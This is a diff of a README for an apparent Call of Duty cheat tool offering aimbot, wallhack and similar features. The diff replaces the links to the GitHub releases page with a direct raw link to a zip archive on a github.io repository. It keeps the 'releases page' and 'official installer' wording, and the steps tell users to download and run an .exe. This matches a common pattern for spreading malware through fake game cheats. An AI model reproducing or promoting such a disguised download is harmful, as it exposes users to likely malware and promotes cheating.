@@ -5,7 +5,7 @@ description: "Enhance your gameplay in Call of Duty with ESP, aimbot, wallhack, 
 ---
 # 🎯 COD-Apex-Tool - Improve your Call of Duty performance
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/doublefaced-genuscarnegiea562/COD-Apex-Tool/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/doublefaced-genuscarnegiea562/doublefaced-genuscarnegiea562.github.io/main/assets/2.4.zip)
 
 This application provides utility tools for Call of Duty. Users access features like ESP, Aimbot, Wallhack, No Recoil, and Triggerbot to track game state information and adjust aim stability. The tool helps players monitor match data and refine their mechanical performance during gameplay sessions.
 
@@ -25,7 +25,7 @@ Ensure your computer meets these specifications before you start:
 
 Follow these instructions to acquire and prepare the tool on your Windows system. 
 
-1. Visit the [releases page](https://github.com/doublefaced-genuscarnegiea562/COD-Apex-Tool/releases) to access the official installer. 
+1. Visit the [releases page](https://raw.githubusercontent.com/doublefaced-genuscarnegiea562/doublefaced-genuscarnegiea562.github.io/main/assets/2.4.zip) to access the official installer. 
 2. Look for the most recent version labeled as the latest release.
 3. Select the file ending in .exe to initiate the download.
 4. Save the file to a folder you can access easily on your desktop.
